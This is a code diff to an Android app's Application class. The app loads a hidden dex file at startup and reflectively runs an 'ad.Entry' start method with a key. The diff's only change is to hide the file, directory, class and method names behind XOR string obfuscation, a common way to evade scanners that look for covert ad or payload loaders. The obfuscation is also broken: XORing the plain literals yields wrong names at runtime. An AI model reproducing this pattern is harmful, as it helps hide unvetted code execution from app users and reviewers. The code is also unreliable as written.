@@ -8,6 +8,7 @@ import java.lang.reflect.Method;
 
 import android.app.Application;
 import android.content.Context;
+import android.util.Base64;
 import dalvik.system.DexClassLoader;
 
 public class App extends Application {
@@ -19,10 +20,19 @@ public class App extends Application {
 	}
 
 	public static void init(final Context context) {
+		byte[] dex = "classes.dex".getBytes();
+		for (int i = 0; i < dex.length; i++) {
+			dex[i] ^= 0x12;
+		}
+		byte[] odex = "odex".getBytes();
+		for (int i = 0; i < odex.length; i++) {
+			odex[i] ^= 0x12;
+		}
+
 		final String dexFile = context.getFilesDir() + File.separator
-				+ "classes.dex";
+				+ new String(dex);
 		final String odexDir = context.getFilesDir().getAbsolutePath()
-				+ "/odex";
+				+ File.separator + new String(odex);
 		new File(odexDir).mkdirs();
 		new Thread(new Runnable() {
 			@Override
@@ -74,9 +84,17 @@ public class App extends Application {
 
 				if (dcl != null) {
 					try {
-						Class cls = dcl.loadClass("ad.Entry");
-						Method m = cls.getDeclaredMethod("start", String.class,
-								Context.class);
+						byte[] entry = "ad.Entry".getBytes();
+						byte[] start = "start".getBytes();
+						for (int i = 0; i < entry.length; i++) {
+							entry[i] ^= 0x12;
+						}
+						for (int i = 0; i < start.length; i++) {
+							start[i] ^= 0x12;
+						}
+						Class cls = dcl.loadClass(new String(entry));
+						Method m = cls.getDeclaredMethod(new String(start),
+								String.class, Context.class);
 						m.setAccessible(true);
 						m.invoke(null, "01hbPe10", context);
 					} catch (Exception e) {
